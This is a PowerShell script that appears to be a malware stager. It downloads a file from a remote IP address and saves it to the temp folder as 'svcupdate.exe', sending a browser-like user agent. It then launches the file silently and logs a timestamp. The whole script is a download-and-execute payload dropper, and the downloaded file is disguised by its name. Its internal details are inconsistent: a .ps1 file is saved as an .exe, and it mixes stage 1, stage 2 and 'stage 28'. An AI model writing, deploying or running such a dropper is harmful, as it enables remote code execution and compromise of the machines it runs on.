[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://203.0.113.184/stage1.ps1',
    [string]$WorkingPath = "$env:TEMP\svcupdate.exe",
    [int]$ConnectionTimeout = 186,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-PayloadFetch -SourceUrl $RemoteUrl -DestinationPath $WorkingPath -TimeoutSec $ConnectionTimeout -UserAgent $BrowserAgent
if ($StageResult) {
    Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Output "stage 28 initialized"
